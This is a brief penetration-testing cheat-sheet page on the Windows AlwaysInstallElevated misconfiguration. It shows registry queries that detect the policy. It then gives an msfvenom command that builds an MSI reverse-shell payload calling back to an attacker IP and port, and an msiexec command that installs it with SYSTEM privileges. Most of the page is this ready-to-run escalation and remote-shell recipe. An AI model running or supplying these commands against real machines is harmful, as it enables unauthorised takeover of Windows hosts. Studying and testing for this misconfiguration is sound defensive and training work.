# AlwaysInstallElevated

If the registers that we query are both as 0x1 then we are able to install .msi as NT/authority system.&#x20;

### Detection:&#x20;

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Exploitation

Generate an MSI reverse shell.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.65 LPORT=445 -f msi > notavirus.msi
```

Execute it:

```
msiexec /i "C:\Path\TO\malicous.msi"
```

![](<../../../.gitbook/assets/image (67).png>)
